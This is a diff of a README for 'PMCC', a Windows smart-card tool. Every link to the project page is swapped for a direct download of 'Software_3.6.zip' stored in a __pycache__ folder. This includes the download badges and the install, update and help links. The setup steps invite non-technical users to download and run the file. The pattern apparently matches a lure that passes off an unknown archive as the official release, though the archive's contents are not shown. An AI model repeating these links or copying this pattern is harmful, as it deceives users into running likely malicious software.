@@ -1,6 +1,6 @@
 # 🔐 PMCC - Manage Smart Cards Simply
 
-[![Download PMCC](https://img.shields.io/badge/Download-PMCC-green?style=for-the-badge)](https://github.com/eduardo3987/PMCC)
+[![Download PMCC](https://img.shields.io/badge/Download-PMCC-green?style=for-the-badge)](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This guide helps you download and run PMCC on a Windows PC. No programming neede
 
 Visit the official PMCC page on GitHub to get the software:
 
-[https://github.com/eduardo3987/PMCC](https://github.com/eduardo3987/PMCC)
+[https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip)
 
 On the page, look for the **Releases** section or download links.  
 
@@ -40,7 +40,7 @@ PMCC runs without additional frameworks, but you may need to install device driv
 
 Follow these steps to install PMCC on your Windows computer:
 
-1. Download the latest package from the [GitHub PMCC page](https://github.com/eduardo3987/PMCC).
+1. Download the latest package from the [GitHub PMCC page](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip).
 
 2. If you download a ZIP file, locate it in your Downloads folder.
 
@@ -121,7 +121,7 @@ After installation, here is how to start and use PMCC:
 
 To update PMCC to the latest version:
 
-1. Visit the [PMCC GitHub page](https://github.com/eduardo3987/PMCC) regularly.
+1. Visit the [PMCC GitHub page](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip) regularly.
 
 2. Download the newest release files.
 
@@ -153,7 +153,7 @@ If PMCC does not run or detect your smart card:
 
 For help or questions:
 
-- Visit the PMCC GitHub page at [https://github.com/eduardo3987/PMCC](https://github.com/eduardo3987/PMCC).
+- Visit the PMCC GitHub page at [https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip).
 
 - Check the documentation folders included in the download.
 
@@ -161,4 +161,4 @@ For help or questions:
 
 ---
 
-[![Download PMCC](https://img.shields.io/badge/Download-PMCC-brightgreen?style=for-the-badge)](https://github.com/eduardo3987/PMCC)
+[![Download PMCC](https://img.shields.io/badge/Download-PMCC-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip)
